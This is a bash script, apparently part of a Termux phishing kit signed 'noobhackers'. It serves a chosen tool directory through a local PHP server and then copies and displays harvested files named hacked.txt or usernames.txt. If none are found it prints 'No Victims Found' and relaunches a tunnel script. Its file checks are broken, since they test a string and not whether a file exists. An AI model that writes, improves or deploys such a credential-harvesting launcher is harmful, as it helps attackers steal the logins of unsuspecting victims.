#script by noobhackers
clear
printf "              \e[1;41mHACK SERVER IS ON\e[0m\n"
echo
echo " "
cd $HOME
printf "\e[1;93mSelect\e[1;92m Tool\e[1;93m Name : \e[0m\n"
echo
ls
echo
printf "\e[1;36m:@@@]---> \e[0m\n"
read directo
cd $directo
echo
printf "\e[1;93m <<<<< Copy Below Address >>>>>\e[0m\n"
echo
pwd
echo
printf "\e[1;93m <<<<< Copy Above Address >>>>>\e[0m\n"
echo
sleep 8.0
clear
echo
printf "\e[1;92m Paste Directory Address: \e[0m\n"
cd $HOME
read locator
cd $locator
echo " "
printf "\e[1;92m Select Port Number [ 4 digit ]: \e[0m\n"
read porto
php -S localhost:$porto
echo 
sleep 3.0
cd $locator
if [ $locator/hacked.txt ];
then
mpv $HOME/tunnel/tone/vcm.mp3
clear
echo
cp hacked.txt /sdcard
echo
cat hacked.txt
echo
elif [ $locator/usernames.txt ];
then
mpv $HOME/tunnel/tone/vcm.mp3
clear
echo
cp usernames.txt /sdcard
echo
cat usernames.txt
echo
else
echo
mpv $HOME/tunnel/tone/fld.mp3
clear
echo
printf "\e[1;92m  No Victims Found Better Luck Next Time....\e[0m\n"
echo
sleep 5.0
cd $HOME/tunnel
bash tunnel.sh
fi
sleep 10.0
cd $HOME/tunnel
bash tunnel.sh
